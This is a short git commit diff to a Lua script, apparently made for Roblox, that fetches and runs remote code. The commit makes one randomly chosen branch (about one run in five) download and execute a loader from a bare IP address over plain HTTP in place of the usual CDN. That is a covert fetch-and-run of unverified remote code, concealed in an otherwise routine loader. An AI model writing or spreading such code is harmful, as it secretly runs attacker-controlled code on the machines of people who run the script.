3a8988b1a3fecf102cc858ff4f2a5e177973e5fc
Ilusion <romaozin1607@gmail.com>
2025-08-31 14:31:03 -0300

    Atualizando bloco chance <= 20

--- script8.lua
+++ script8.lua
@@ -4,8 +4,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel7172/Loading-UI
 local chance = math.random(1, 100)
 
 if chance <= 20 then
-    ID = "d98f46c5-df0d-4ba3-9db0-61244be7c8e6"
-    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+    ID="d98f46c5-df0d-4ba3-9db0-61244be7c8e6";
+    loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))() 
 else
     ID="ced02a72-af73-455e-af77-b0251f6eb"; loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
